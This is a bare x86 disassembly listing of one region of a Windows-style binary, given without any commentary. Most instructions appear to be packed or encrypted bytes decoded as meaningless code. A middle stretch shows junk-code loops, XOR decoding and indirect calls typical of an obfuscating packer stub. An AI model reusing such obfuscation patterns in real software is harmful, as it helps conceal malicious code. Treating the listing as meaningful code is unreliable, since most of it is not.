  40f361:	jmp    FWORD PTR [ebp-0x5da36c0d]
  40f367:	aam    0x17
  40f369:	inc    edx
  40f36a:	pop    ds
  40f36b:	pop    es
  40f36c:	xor    ah,BYTE PTR [edi+0x4af8df88]
  40f372:	inc    edx
  40f373:	out    0xb6,eax
  40f375:	stos   BYTE PTR es:[edi],al
  40f376:	inc    ecx
  40f377:	inc    esi
  40f378:	retf   
  40f379:	add    ebp,ebp
  40f37b:	and    BYTE PTR [esi],dl
  40f37d:	cld    
  40f37e:	xor    BYTE PTR [eax-0x2ad13cc5],al
  40f384:	adc    DWORD PTR [edi],edi
  40f386:	repz aad 0x9b
  40f389:	ret    0xa6a2
  40f38c:	jae    0x40f34f
  40f38e:	test   eax,0xeda5bd56
  40f393:	jp     0x40f3fd
  40f395:	sti    
  40f396:	outs   dx,BYTE PTR ds:[esi]
  40f397:	xlat   BYTE PTR ds:[ebx]
  40f398:	fcom   DWORD PTR [ebx+0x3dc43dab]
  40f39e:	jle    0x40f36e
  40f3a0:	xchg   ebp,eax
  40f3a1:	xchg   ebx,eax
  40f3a2:	ret    
  40f3a3:	lock push esp
  40f3a5:	mov    ds:0xaf0dbe17,al
  40f3aa:	repnz add al,0x74
  40f3ad:	add    BYTE PTR [ecx-0x2c50a178],0xea
  40f3b4:	or     ah,BYTE PTR [ebp+0x18d9e2be]
  40f3ba:	rcl    esp,0x64
  40f3bd:	fiadd  DWORD PTR [ebp+esi*8+0x19]
  40f3c1:	shl    bh,1
  40f3c3:	add    dl,BYTE PTR [ecx-0x43681e0]
  40f3c9:	and    al,0x5d
  40f3cb:	jmp    0xc716c415
  40f3d0:	pop    ds
  40f3d1:	xchg   ebx,esi
  40f3d3:	sbb    DWORD PTR [ecx],ecx
  40f3d5:	out    dx,eax
  40f3d6:	or     DWORD PTR [ebx],0xbdd7f12
  40f3dc:	sbb    DWORD PTR [ebx],ebp
  40f3de:	shl    DWORD PTR [ecx-0x6f],0x4f
  40f3e2:	scas   al,BYTE PTR es:[edi]
  40f3e3:	cmc    
  40f3e4:	es mov ah,0x18
  40f3e7:	jno    0x40f395
  40f3e9:	out    dx,eax
  40f3ea:	mov    ecx,0xab131ac3
  40f3ef:	(bad)  
  40f3f0:	bound  esp,QWORD PTR [edi-0x20]
  40f3f3:	ja     0x40f45c
  40f3f5:	mov    cl,0x41
  40f3f7:	push   ebx
  40f3f8:	ja     0x40f404
  40f3fa:	fisubr DWORD PTR [esi]
  40f3fc:	adc    ebp,DWORD PTR [ebx]
  40f3fe:	mov    ebp,0x96b608f5
  40f403:	clc    
  40f404:	loopne 0x40f434
  40f406:	push   cs
  40f407:	pop    ebx
  40f408:	cmp    ebx,esp
  40f40a:	and    bh,0x7f
  40f40d:	push   ebx
  40f40e:	aas    
  40f40f:	lods   eax,DWORD PTR ds:[esi]
  40f410:	in     eax,dx
  40f411:	and    BYTE PTR [edx+0x53b533b4],al
  40f417:	mov    ds:0xb9f75d3c,eax
  40f41c:	add    DWORD PTR [ebp+ebp*4-0x54c037b8],edi
  40f423:	(bad)  
  40f424:	js     0x40f46f
  40f426:	mov    bl,0x19
  40f428:	loop   0x40f479
  40f42a:	dec    ebx
  40f42b:	ret    0xfa8c
  40f42e:	fadd   QWORD PTR [ebx-0x31]
  40f431:	mov    BYTE PTR [ebx-0xb],dh
  40f434:	ins    DWORD PTR es:[edi],dx
  40f435:	xor    DWORD PTR [edi],ecx
  40f437:	push   es
  40f438:	loopne 0x40f3f9
  40f43a:	or     dl,BYTE PTR [edi]
  40f43c:	ins    BYTE PTR es:[edi],dx
  40f43d:	leave  
  40f43e:	and    eax,0x7d7a17bf
  40f443:	jbe    0x40f42e
  40f445:	nop
  40f446:	push   es
  40f447:	mov    esp,0xa8982691
  40f44c:	push   ebp
  40f44d:	les    eax,FWORD PTR [ebx-0x7356f49b]
  40f453:	(bad)  
  40f454:	test   BYTE PTR [eax-0xc1f62b1],bh
  40f45a:	leave  
  40f45b:	jge    0x40f497
  40f45d:	cmp    ch,BYTE PTR [esi]
  40f45f:	sbb    ebx,ecx
  40f461:	mov    ebx,0xe97bbccf
  40f466:	xchg   BYTE PTR [esi+0x56],dh
  40f469:	out    0xc,eax
  40f46b:	dec    edi
  40f46c:	jle    0x40f4e0
  40f46e:	jmp    0x40f489
  40f470:	or     bh,BYTE PTR [ebp+0x4abb913f]
  40f476:	cmc    
  40f477:	push   es
  40f478:	call   0x370b4728
  40f47d:	pop    ebx
  40f47e:	sub    cl,BYTE PTR [edi-0x5f]
  40f481:	push   edi
  40f482:	stos   DWORD PTR es:[edi],eax
  40f483:	pop    ebp
  40f484:	dec    eax
  40f485:	lea    edx,[edx+0x58]
  40f488:	jns    0x40f48e
  40f48a:	inc    eax
  40f48b:	pop    eax
  40f48c:	inc    ecx
  40f48d:	jle    0x40f4dc
  40f48f:	hlt    
  40f490:	hlt    
  40f491:	ja     0x40f50a
  40f493:	retf   0x576b
  40f496:	sub    bl,BYTE PTR [ebx+0x5d]
  40f499:	dec    ebp
  40f49a:	(bad)  
  40f49b:	out    dx,al
  40f49c:	xchg   esp,eax
  40f49d:	in     eax,0x67
  40f49f:	cmp    BYTE PTR ds:0x649cc3cb,0xdd
  40f4a6:	bound  edx,QWORD PTR [ebx-0x4e762823]
  40f4ac:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40f4ae:	jp     0x40f467
  40f4b0:	pop    ds
  40f4b1:	mov    ecx,0x1144d750
  40f4b6:	jp     0x40f463
  40f4b8:	mov    ebx,ebx
  40f4ba:	push   edx
  40f4bb:	ret    
  40f4bc:	test   al,0x4e
  40f4be:	popa   
  40f4bf:	adc    DWORD PTR [edx-0x1e],edi
  40f4c2:	in     al,0x5e
  40f4c4:	or     esp,DWORD PTR [esi]
  40f4c6:	fs push es
  40f4c8:	inc    esp
  40f4c9:	mov    cl,0xe2
  40f4cb:	shl    BYTE PTR [ebx+0x3f],cl
  40f4ce:	adc    DWORD PTR [ebx-0x2850850e],esi
  40f4d4:	inc    ecx
  40f4d5:	das    
  40f4d6:	(bad)  
  40f4d7:	sbb    al,0xae
  40f4d9:	scas   al,BYTE PTR es:[edi]
  40f4da:	das    
  40f4db:	sbb    BYTE PTR [esi-0x10],bl
  40f4de:	push   eax
  40f4df:	xchg   ebx,eax
  40f4e0:	jge    0x40f49d
  40f4e2:	imul   DWORD PTR [ebx-0x5a]
  40f4e5:	xor    DWORD PTR [edi],ecx
  40f4e7:	addr16 dec ebx
  40f4e9:	dec    edx
  40f4ea:	jmp    0xb8da:0x53093092
  40f4f1:	dec    ebp
  40f4f2:	sub    eax,0xaae50e2c
  40f4f7:	mov    al,ds:0x4124c368
  40f4fc:	lahf   
  40f4fd:	jb     0x40f54a
  40f4ff:	dec    edi
  40f500:	jmp    0x2fe26c82
  40f505:	mov    ebx,0xf169fdbf
  40f50a:	dec    esi
  40f50b:	xor    eax,0xf1d2b81d
  40f510:	push   0x4b
  40f512:	test   eax,0x42928794
  40f517:	daa    
  40f518:	pushf  
  40f519:	push   edi
  40f51a:	pop    edi
  40f51b:	cs repnz sti 
  40f51e:	sbb    esp,DWORD PTR [ebx-0x67]
  40f521:	or     eax,0x3dd9989e
  40f526:	retf   
  40f527:	les    esp,FWORD PTR [ebx-0x1a305836]
  40f52d:	adc    BYTE PTR [ebp-0x3400efe3],ah
  40f533:	stos   DWORD PTR es:[edi],eax
  40f534:	pop    ebp
  40f535:	mov    ch,0x60
  40f537:	js     0x40f4f8
  40f539:	in     eax,0xd5
  40f53b:	pusha  
  40f53c:	sar    DWORD PTR [ebx+edi*8-0x5ba688ba],cl
  40f543:	jl     0x40f54b
  40f545:	mov    bh,0x97
  40f547:	cmp    BYTE PTR [edx+0x34749c80],cl
  40f54d:	stc    
  40f54e:	pop    ecx
  40f54f:	cld    
  40f550:	jmp    0x40f503
  40f552:	sbb    cl,BYTE PTR [ebx+0x5e4be704]
  40f558:	xchg   ecx,eax
  40f559:	mov    BYTE PTR [ebp+ebp*2-0x38b63842],al
  40f560:	(bad)  
  40f561:	out    0xc0,al
  40f563:	pshufw mm0,QWORD PTR [esi],0xc0
  40f567:	sub    ebp,DWORD PTR [esi-0x69]
  40f56a:	pop    edx
  40f56b:	mov    esp,0x2593b8ae
  40f570:	push   0x164a7e8
  40f575:	jb     0x40f543
  40f577:	mov    edx,0x97a1d519
  40f57c:	loope  0x40f534
  40f57e:	sub    DWORD PTR [ebp+edi*8+0xd],0x925a1cc6
  40f586:	add    BYTE PTR [edi+0x37],cl
  40f589:	adc    BYTE PTR [ebx+eiz*8+0x675b1929],bh
  40f590:	aam    0xb2
  40f592:	xor    dh,BYTE PTR [edi]
  40f594:	pop    eax
  40f595:	mov    esp,0xc74419a6
  40f59a:	and    DWORD PTR [eax+ebp*2],edi
  40f59d:	jno    0x40f61c
  40f59f:	xchg   edx,eax
  40f5a0:	stc    
  40f5a1:	cdq    
  40f5a2:	push   ds
  40f5a3:	popf   
  40f5a4:	and    ch,0xc4
  40f5a7:	jle    0x40f573
  40f5a9:	pop    ss
  40f5aa:	lods   al,BYTE PTR ds:[esi]
  40f5ab:	or     ah,0x74
  40f5ae:	cmp    edi,esi
  40f5b0:	jbe    0x40f5bc
  40f5b2:	jg     0x40f56b
  40f5b4:	(bad)  
  40f5b5:	mov    dl,0x5
  40f5b7:	out    dx,eax
  40f5b8:	adc    cl,BYTE PTR [esi*1-0x234ba26a]
  40f5bf:	jmp    0x40f5c5
  40f5c1:	in     al,0xa0
  40f5c3:	and    al,0x38
  40f5c5:	(bad)  
  40f5c7:	std    
  40f5c8:	lds    eax,FWORD PTR [ebx-0x6e023127]
  40f5ce:	lea    eax,[ebx+edi*4+0x52a95c13]
  40f5d5:	inc    esi
  40f5d6:	outs   dx,DWORD PTR ds:[esi]
  40f5d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5d8:	adc    eax,0x350168e8
  40f5dd:	jl     0x40f62e
  40f5df:	sub    DWORD PTR [ebp-0x33],esp
  40f5e2:	int3   
  40f5e3:	enter  0x3cba,0x74
  40f5e7:	das    
  40f5e8:	inc    ecx
  40f5e9:	jno    0x40f62c
  40f5eb:	jge    0x40f619
  40f5ed:	cld    
  40f5ee:	test   al,0x5a
  40f5f0:	imul   DWORD PTR [edx-0x36]
  40f5f3:	call   0xf0c5f1be
  40f5f8:	mov    esi,0xaa1a8158
  40f5fd:	aaa    
  40f5fe:	mov    eax,0xc519a347
  40f603:	mov    DWORD PTR [esi],ebx
  40f605:	inc    ebp
  40f606:	(bad)  
  40f607:	mov    esi,0xfdbc1afe
  40f60c:	xor    esi,ebx
  40f60e:	xchg   ecx,eax
  40f60f:	pop    eax
  40f610:	cld    
  40f611:	sbb    edx,esp
  40f613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f614:	pop    eax
  40f615:	pop    ebx
  40f616:	(bad)  
  40f617:	push   0x11
  40f619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f61a:	sar    DWORD PTR [ecx-0x41],0x6f
  40f61e:	imul   eax,DWORD PTR cs:[edi-0x92debd9],0x24
  40f626:	punpckhwd mm7,QWORD PTR [eax]
  40f629:	mov    bh,0x28
  40f62b:	cli    
  40f62c:	jle    0x40f5e5
  40f62e:	jl     0x40f5cb
  40f630:	test   BYTE PTR [edx+0x2a],al
  40f633:	arpl   WORD PTR [edx+0x6847de81],bx
  40f639:	mov    bl,0x92
  40f63b:	jl     0x40f5d8
  40f63d:	dec    esi
  40f63e:	imul   edx,ecx,0x32716199
  40f644:	adc    al,0x7c
  40f646:	push   0x2c
  40f648:	xchg   ecx,eax
  40f649:	sbb    BYTE PTR [edi-0x3b],cl
  40f64c:	aas    
  40f64d:	push   esp
  40f64e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f64f:	and    eax,0xe199f718
  40f654:	ss jg  0x40f62c
  40f657:	push   esp
  40f658:	mov    dh,0xf1
  40f65a:	das    
  40f65b:	xor    eax,DWORD PTR [edx+0x4b]
  40f65e:	pop    ds
  40f65f:	cwde   
  40f660:	cmp    DWORD PTR [eax-0x28],edx
  40f663:	pushf  
  40f664:	addr16 clc 
  40f666:	inc    eax
  40f667:	ja     0x40f650
  40f669:	and    dh,BYTE PTR [eax+0x39]
  40f66c:	sub    ah,cl
  40f66e:	pop    esp
  40f66f:	(bad)  
  40f670:	stos   DWORD PTR es:[edi],eax
  40f671:	xchg   ebx,eax
  40f672:	sbb    ecx,eax
  40f674:	stos   DWORD PTR es:[edi],eax
  40f675:	xor    ebx,DWORD PTR [ebx-0x7b144039]
  40f67b:	out    dx,eax
  40f67c:	les    ebp,FWORD PTR [ebp-0x761d7f32]
  40f682:	pop    eax
  40f683:	loop   0x40f63c
  40f685:	xchg   esp,eax
  40f686:	pop    esp
  40f687:	and    ah,bh
  40f689:	or     eax,0xdcae132a
  40f68e:	(bad)  [ecx-0x5e]
  40f691:	in     al,0x49
  40f693:	(bad)  
  40f694:	and    eax,0x896faa05
  40f699:	pop    edi
  40f69a:	mov    ah,0xd6
  40f69c:	mov    eax,ds:0xd1b288fb
  40f6a1:	cmp    al,0xaf
  40f6a3:	and    eax,0x34b05b95
  40f6a8:	shl    BYTE PTR [ebx+0x320801bc],0x89
  40f6af:	push   edi
  40f6b0:	xchg   ecx,eax
  40f6b1:	sbb    bh,BYTE PTR [edi+esi*1-0x3a2e3f8]
  40f6b8:	lods   eax,DWORD PTR ds:[esi]
  40f6b9:	mov    eax,ds:0xb6e262b4
  40f6be:	lock sub al,0xe4
  40f6c1:	or     eax,ebp
  40f6c3:	sub    bh,bl
  40f6c5:	xchg   ecx,eax
  40f6c6:	sub    DWORD PTR [edi+0x37570a8d],0xffffffe0
  40f6cd:	sbb    BYTE PTR [ebx+0x1d2ac011],dl
  40f6d3:	faddp  st(6),st
  40f6d5:	sti    
  40f6d6:	add    eax,DWORD PTR [esi+0x76bd0499]
  40f6dc:	sbb    BYTE PTR ds:0x9026acb9,0x24
  40f6e3:	sbb    al,0xc3
  40f6e5:	cwde   
  40f6e6:	push   ss
  40f6e7:	(bad)  
  40f6e8:	jns    0x40f69b
  40f6ea:	xor    BYTE PTR [edx-0x28],ah
  40f6ed:	sbb    BYTE PTR [eax-0x3fbcbea4],al
  40f6f3:	jo     0x40f713
  40f6f5:	pop    esi
  40f6f6:	adc    al,0xbf
  40f6f8:	ficomp DWORD PTR [edi-0x7d85e901]
  40f6fe:	ins    DWORD PTR es:[edi],dx
  40f6ff:	retf   
  40f700:	jmp    0x40f6d8
  40f702:	shr    BYTE PTR [edi],1
  40f704:	daa    
  40f705:	add    ah,BYTE PTR [ecx+ebp*1+0x33]
  40f709:	add    bh,bh
  40f70b:	sbb    al,0x98
  40f70d:	bound  ecx,QWORD PTR [edi-0x715f6aa6]
  40f713:	bound  edx,QWORD PTR [eax-0x59]
  40f716:	clc    
  40f717:	lahf   
  40f718:	mov    dl,BYTE PTR [ecx+0x59aaeaf9]
  40f71e:	in     eax,dx
  40f71f:	les    ebp,FWORD PTR [eax]
  40f721:	cwde   
  40f722:	lods   al,BYTE PTR ds:[esi]
  40f723:	jne    0x40f789
  40f725:	popf   
  40f726:	out    dx,eax
  40f727:	pusha  
  40f728:	icebp  
  40f729:	mov    edi,0x7fb73c4b
  40f72e:	jb     0x40f745
  40f730:	ret    0xbe64
  40f733:	pop    es
  40f734:	sti    
  40f735:	mov    ecx,0xf39c9b92
  40f73a:	mov    ebp,0xbd49bcdd
  40f73f:	pop    ss
  40f740:	jmp    0xc532:0x89d3bdd0
  40f747:	sub    dh,ah
  40f749:	ds dec ebp
  40f74b:	xor    ah,cl
  40f74d:	in     eax,0xaa
  40f74f:	sbb    DWORD PTR [ebx+0x3e],edx
  40f752:	jp     0x40f707
  40f754:	jp     0x40f797
  40f756:	jno    0x40f719
  40f758:	ja     0x40f6db
  40f75a:	stos   BYTE PTR es:[edi],al
  40f75b:	or     BYTE PTR [eax+eax*1+0x65],dl
  40f75f:	lods   eax,DWORD PTR ds:[esi]
  40f760:	inc    eax
  40f761:	or     al,0x4a
  40f763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f764:	retf   0xa36f
  40f767:	mov    ecx,0xb2127eff
  40f76c:	push   ebx
  40f76d:	jg     0x40f73c
  40f76f:	push   ebp
  40f770:	dec    eax
  40f771:	and    bh,BYTE PTR [ebx+0x18]
  40f774:	lock jle 0x40f75a
  40f777:	test   BYTE PTR ds:0xb28cf3e3,al
  40f77d:	add    bl,ch
  40f77f:	jnp    0x40f780
  40f781:	push   esi
  40f782:	(bad)  
  40f784:	pop    eax
  40f785:	mov    edi,0x97195a16
  40f78a:	xchg   BYTE PTR [ebx+0x3b],dh
  40f78d:	and    DWORD PTR [edx],edi
  40f78f:	fsub   DWORD PTR [edi]
  40f791:	cmp    BYTE PTR [esi+0x66c5934e],dh
  40f797:	clc    
  40f798:	and    esp,DWORD PTR [ebx-0x3]
  40f79b:	sbb    DWORD PTR [edi+0x9],0x12c6ec7f
  40f7a2:	int    0xaa
  40f7a4:	mov    edi,0x5acebc41
  40f7a9:	pop    edx
  40f7aa:	jecxz  0x40f74d
  40f7ac:	stos   DWORD PTR es:[edi],eax
  40f7ad:	jnp    0x40f81b
  40f7af:	pop    esp
  40f7b0:	rcr    esp,cl
  40f7b2:	mov    dl,0x34
  40f7b4:	xor    BYTE PTR [ebp-0x7998d851],ch
  40f7ba:	ja     0x40f73f
  40f7bc:	(bad)  
  40f7bd:	lahf   
  40f7be:	adc    esp,DWORD PTR [esi+0xc04d3d]
  40f7c4:	repnz lds esi,FWORD PTR [ecx+0x3a]
  40f7c8:	(bad)  
  40f7c9:	xchg   ebp,eax
  40f7ca:	add    cl,BYTE PTR [edi-0x5d]
  40f7cd:	pop    ecx
  40f7ce:	imul   edx,eax,0xcb90f6a2
  40f7d4:	shr    BYTE PTR [edi+0x7697306d],1
  40f7da:	fucom  st(3)
  40f7dc:	mov    ebx,0x39883cd8
  40f7e1:	xchg   ebp,eax
  40f7e2:	(bad)  
  40f7e3:	in     eax,dx
  40f7e4:	xchg   edx,eax
  40f7e5:	(bad)  
  40f7e6:	and    eax,DWORD PTR [eax]
  40f7e8:	dec    eax
  40f7e9:	(bad)  
  40f7ea:	mov    al,BYTE PTR [esi]
  40f7ec:	mov    al,0xa1
  40f7ee:	rcl    DWORD PTR [edi+0x713964d4],0x84
  40f7f5:	fdivrp st(2),st
  40f7f7:	push   0xffffffa5
  40f7f9:	leave  
  40f7fa:	addr16 push esi
  40f7fc:	ds push es
  40f7fe:	add    eax,0x46e4bce2
  40f803:	jp     0x40f78a
  40f805:	in     eax,0x67
  40f807:	mov    ah,0x38
  40f809:	dec    ecx
  40f80a:	mov    edi,0x8e973aad
  40f80f:	in     al,dx
  40f810:	in     eax,0x7b
  40f812:	mov    cl,0x75
  40f814:	adc    ch,BYTE PTR [ebx]
  40f816:	popa   
  40f817:	mov    esi,DWORD PTR [ebp-0x7c]
  40f81a:	in     al,dx
  40f81b:	push   es
  40f81c:	hlt    
  40f81d:	pusha  
  40f81e:	push   eax
  40f81f:	jl     0x40f842
  40f821:	inc    edi
  40f822:	mov    bl,0x65
  40f824:	inc    esp
  40f825:	jmp    0x3c6d008b
  40f82a:	in     eax,dx
  40f82b:	loop   0x40f850
  40f82d:	(bad)  
  40f82e:	fistp  QWORD PTR [edi+0x34]
  40f831:	xor    eax,0x67cd1db
  40f836:	push   ebp
  40f837:	in     al,0x21
  40f839:	xchg   ebx,eax
  40f83a:	dec    edi
  40f83b:	add    eax,0xf9e764c3
  40f840:	sbb    DWORD PTR [eax+eiz*2-0x7f],esi
  40f844:	push   ds
  40f845:	xchg   esp,eax
  40f846:	shl    DWORD PTR [edx+ecx*1-0x25],cl
  40f84a:	dec    esp
  40f84b:	clc    
  40f84c:	imul   edi,DWORD PTR [ebx+0x6383046d],0x77
  40f853:	rcl    DWORD PTR [ecx-0x78b66eb8],0xd1
  40f85a:	dec    edx
  40f85b:	push   edx
  40f85c:	mov    edx,ebx
  40f85e:	pop    ebx
  40f85f:	dec    ebx
  40f860:	call   DWORD PTR [ebx]
  40f862:	cmp    DWORD PTR [ebp+0x10],esi
  40f865:	je     0x40f884
  40f86b:	xchg   edx,eax
  40f86c:	push   0xb
  40f86e:	pop    ecx
  40f86f:	push   0x4
  40f871:	pop    ebx
  40f872:	inc    ebx
  40f873:	xchg   ebx,ecx
  40f875:	sub    ebx,ecx
  40f877:	xchg   ebx,ecx
  40f879:	dec    ecx
  40f87a:	dec    ecx
  40f87b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f87e:	imul   eax,ecx
  40f881:	add    esp,eax
  40f883:	xchg   edx,eax
  40f884:	push   eax
  40f885:	xor    ebx,ebx
  40f887:	mov    edx,esp
  40f889:	dec    edx
  40f88a:	inc    ebx
  40f88b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f88e:	dec    ebx
  40f88f:	xor    edx,edx
  40f891:	add    DWORD PTR [ebp-0xc],ebx
  40f894:	pop    ebx
  40f895:	mov    eax,DWORD PTR [ebp-0xc]
  40f898:	pop    edi
  40f899:	pop    esi
  40f89a:	pop    ebx
  40f89b:	leave  
  40f89c:	ret    0x10
  40f89f:	push   ebp
  40f8a0:	mov    ebp,esp
  40f8a2:	push   ecx
  40f8a3:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  40f8aa:	add    DWORD PTR ds:0x42c010,0x33e6
  40f8b4:	mov    eax,DWORD PTR [ebp-0x4]
  40f8b7:	or     edx,ecx
  40f8b9:	mov    edx,DWORD PTR [ebp+0x10]
  40f8bc:	mov    ecx,0x7510893
  40f8c1:	xor    eax,ecx
  40f8c3:	and    DWORD PTR ds:0x42d008,0x1b89
  40f8cd:	add    eax,0x3272db
  40f8d2:	or     DWORD PTR ds:0x42a01c,0x429008
  40f8dc:	mov    DWORD PTR [edx],eax
  40f8de:	and    DWORD PTR ds:0x42c01c,0x0
  40f8e8:	xor    eax,eax
  40f8ea:	add    eax,DWORD PTR ds:0x42c01c
  40f8f0:	inc    eax
  40f8f1:	mov    ds:0x42c01c,eax
  40f8f6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f8fd:	jne    0x40f90f
  40f903:	push   DWORD PTR [ebp-0x20]
  40f906:	push   DWORD PTR [ebp-0x20]
  40f909:	call   DWORD PTR ds:0x425034
  40f90f:	cmp    DWORD PTR ds:0x42c01c,0x1d
  40f916:	jb     0x40f8e8
  40f91c:	and    DWORD PTR ds:0x42d01c,0x0
  40f926:	jmp    0x40f938
  40f92b:	mov    edx,DWORD PTR ds:0x42d01c
  40f931:	inc    edx
  40f932:	mov    DWORD PTR ds:0x42d01c,edx
  40f938:	cmp    DWORD PTR ds:0x42d01c,0x1b
  40f93f:	jae    0x40f96c
  40f945:	cmp    DWORD PTR ds:0x42d01c,0x1d
  40f94c:	jne    0x40f967
  40f952:	push   0x424564
  40f957:	push   0x424514
  40f95c:	push   0x42c7
  40f961:	call   DWORD PTR ds:0x42503c
  40f967:	jmp    0x40f92b
  40f96c:	mov    eax,DWORD PTR [ebp+0xc]
  40f96f:	xor    eax,ecx
  40f971:	push   esi
  40f972:	mov    esi,DWORD PTR [ebp+0x10]
  40f975:	mov    edx,0x3272db
  40f97a:	add    eax,edx
  40f97c:	mov    DWORD PTR [esi+0x4],eax
  40f97f:	mov    eax,DWORD PTR [ebp+0x14]
  40f982:	mov    esi,DWORD PTR [ebp+0x10]
  40f985:	mov    DWORD PTR [esi+0x8],eax
  40f988:	mov    eax,DWORD PTR [ebp+0x18]
  40f98b:	mov    esi,DWORD PTR [ebp+0x10]
  40f98e:	mov    DWORD PTR [esi+0xc],eax
  40f991:	mov    eax,DWORD PTR [ebp+0x1c]
  40f994:	mov    esi,DWORD PTR [ebp+0x10]
  40f997:	mov    DWORD PTR [esi+0x10],eax
  40f99a:	mov    eax,DWORD PTR [ebp+0x8]
  40f99d:	xor    eax,ecx
  40f99f:	add    eax,edx
  40f9a1:	pop    esi
  40f9a2:	leave  
  40f9a3:	ret    0x18
  40f9a6:	push   ebp
  40f9a7:	mov    ebp,esp
  40f9a9:	mov    eax,ds:0x42400a
  40f9ae:	mov    eax,DWORD PTR [eax+0x1c8]
  40f9b4:	mov    eax,DWORD PTR [eax]
  40f9b6:	movzx  ecx,BYTE PTR ds:0x429000
  40f9bd:	and    DWORD PTR ds:0x42d010,ecx
  40f9c3:	cdq    
  40f9c4:	push   ebx
  40f9c5:	add    DWORD PTR ds:0x42a008,0x429020
  40f9cf:	mov    ecx,0xfabdbef1
  40f9d4:	add    eax,ecx
  40f9d6:	mov    DWORD PTR ds:0x42d008,0x7e66
  40f9e0:	adc    edx,0xffffffff
  40f9e3:	or     DWORD PTR ds:0x42a014,edi
  40f9e9:	push   esi
  40f9ea:	push   edi
  40f9eb:	and    DWORD PTR ds:0x42a00c,0x0
  40f9f5:	jmp    0x40fa09
  40f9fa:	xor    ebx,ebx
  40f9fc:	or     ebx,DWORD PTR ds:0x42a00c
  40fa02:	inc    ebx
  40fa03:	mov    DWORD PTR ds:0x42a00c,ebx
  40fa09:	cmp    DWORD PTR ds:0x42a00c,0x1b
  40fa10:	jae    0x40fa41
  40fa16:	cmp    DWORD PTR ds:0x42a00c,0x26
  40fa1d:	jne    0x40fa36
  40fa23:	push   0x7619
  40fa28:	push   0x3c20
  40fa2d:	push   DWORD PTR [ebp-0x18]
  40fa30:	call   DWORD PTR ds:0x425040
  40fa36:	jmp    0x40f9fa
  40fa3b:	adc    ebx,DWORD PTR ds:0x42d018
  40fa41:	mov    edi,edx
  40fa43:	mov    edx,DWORD PTR [ebp+0x8]
  40fa46:	mov    DWORD PTR ds:0x42c000,0x5718
  40fa50:	mov    ebx,eax
  40fa52:	and    DWORD PTR ds:0x42c004,0x67ab
  40fa5c:	mov    eax,0x8a29a123
  40fa61:	xor    esi,esi
  40fa63:	or     DWORD PTR ds:0x429024,0x42d014
  40fa6d:	xor    ebx,eax
  40fa6f:	or     DWORD PTR ds:0x42d000,0x42a014
  40fa79:	xor    edi,0x0
  40fa7c:	and    DWORD PTR ds:0x42d000,0x42a00c
  40fa86:	add    edx,ecx
  40fa88:	adc    esi,0xffffffff
  40fa8b:	xor    edx,eax
  40fa8d:	or     DWORD PTR ds:0x42c010,0x42b010
  40fa97:	jmp    0x411e4e
  40fa9c:	mov    WORD PTR [ebx+0x6643964b],?
  40faa2:	arpl   WORD PTR [ebx+0x42],sp
  40faa5:	jno    0x40fa92
  40faa7:	shl    BYTE PTR [ebx+0x7818ed9a],cl
  40faad:	mov    fs,WORD PTR [edx+0x62]
  40fab0:	enter  0x625f,0x62
  40fab4:	int    0x13
  40fab6:	jns    0x40fb36
  40fab8:	mov    eax,0xe6fd1be7
  40fabd:	scas   eax,DWORD PTR es:[edi]
  40fabe:	sub    ch,BYTE PTR [edi+0x67]
  40fac1:	ficomp DWORD PTR ss:[ecx+0x7fc87c40]
  40fac8:	mov    ebp,0x3a345150
  40facd:	int3   
  40face:	mov    edi,0x7e5fe57a
  40fad3:	jo     0x40fb4c
  40fad5:	jge    0x40fa9a
  40fad7:	mov    edi,0x96702c7d
  40fadc:	in     al,dx
  40fadd:	imul   DWORD PTR [ebp+0x258b68d3]
  40fae3:	push   ebp
  40fae4:	pop    edx
  40fae5:	jnp    0x40fb27
  40fae7:	enter  0x1a22,0xd6
  40faeb:	xor    dl,BYTE PTR [esi]
  40faed:	aam    0x2e
  40faef:	dec    edx
  40faf0:	cmp    DWORD PTR [esi+0x3caec9c0],eax
  40faf6:	jle    0x40fa8a
  40faf8:	cmp    eax,0x6a2dc367
  40fafd:	adc    al,0x7b
  40faff:	sar    BYTE PTR [ebx],0x1d
  40fb02:	test   eax,0xa4cd68d3
  40fb07:	(bad)  
  40fb08:	xor    dl,BYTE PTR [eax-0x73]
  40fb0b:	out    dx,al
  40fb0c:	call   0xe322:0x4a62e5a5
  40fb13:	cmp    bl,ah
  40fb15:	fdivr  QWORD PTR [edx+0x49]
  40fb18:	dec    edi
  40fb19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb1a:	cwde   
  40fb1b:	lds    ebx,FWORD PTR [edx+0xcadc67e]
  40fb21:	cld    
  40fb22:	sar    BYTE PTR [edi-0x302bf2db],cl
  40fb28:	stc    
  40fb29:	mov    esp,es
  40fb2b:	leave  
  40fb2c:	pop    edx
  40fb2d:	test   eax,0x9dab4ee2
  40fb32:	shr    BYTE PTR [edx+esi*1-0x67ab8800],0xcf
  40fb3a:	test   eax,0x3796dce1
  40fb3f:	cld    
  40fb40:	inc    ebp
  40fb41:	imul   edx,DWORD PTR [edx],0x908dad71
  40fb47:	(bad)  [edx-0x23e7253c]
  40fb4d:	jmp    0x7c8d7833
  40fb52:	into   
  40fb53:	jae    0x40fba9
  40fb55:	and    BYTE PTR [esi-0x2722b0e1],cl
  40fb5b:	test   al,0x78
  40fb5d:	add    BYTE PTR [edx-0x5756c12a],dl
  40fb63:	jecxz  0x40fbaf
  40fb65:	push   cs
  40fb66:	cld    
  40fb67:	add    BYTE PTR [ebx-0x5157ea2d],bh
  40fb6d:	fwait
  40fb6e:	js     0x40fba4
  40fb70:	fs mov ebp,0xc81055e8
  40fb76:	inc    edi
  40fb77:	cmp    ebx,DWORD PTR [eax]
  40fb79:	ss outs dx,DWORD PTR ds:[esi]
  40fb7c:	retf   0xaf44
  40fb7f:	sbb    BYTE PTR [eax],ch
  40fb81:	fidivr WORD PTR [ecx+0x79f6f348]
  40fb87:	out    0xd8,eax
  40fb89:	fld    QWORD PTR [ecx]
  40fb8b:	jns    0x40fb1f
  40fb8d:	std    
